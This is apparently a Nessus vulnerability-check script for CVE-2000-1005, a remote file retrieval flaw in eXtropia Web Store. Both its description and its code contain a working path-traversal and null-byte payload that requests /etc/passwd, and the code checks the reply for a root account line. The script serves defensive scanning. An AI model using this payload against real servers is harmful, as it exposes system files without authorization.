#
# This script was written by Thomas Reinke <reinke@e-softinc.com>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10532);
 script_bugtraq_id(1774);
 script_version ("$Revision: 1.17 $");
 script_cve_id("CVE-2000-1005");
 
 
 name["english"] = "eXtropia Web Store remote file retrieval";
 script_name(english:name["english"]);
 
 desc["english"] = "eXtropia's Web Store shopping cart
program allows the remote file retrieval of any file
that ends in a .html extension. Further, by supplying
a URL with an imbedded null byte, the script can be made
to retrieve any file at all.

Example:
    GET /cgi-bin/Web_Store/web_store.cgi?page=../../../../etc/passwd%00.html

will return /etc/passwd.

Solution: None available at this time

Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "eXtropia Web Store remote file retrieval";
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Thomas Reinke");
 family["english"] = "Remote file access";
 family["francais"] = "Accès aux fichiers distants";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
 buf = string(dir, "/Web_Store/web_store.cgi?page=../../../../../../etc/passwd%00.html");
 buf = http_get(item:buf, port:port);
 rep = http_keepalive_send_recv(port:port, data:buf);
 if( rep == NULL ) exit(0);
 
 if(egrep(pattern:".*root:.*:0:[01]:.*", string:rep))
       security_hole(port);
}

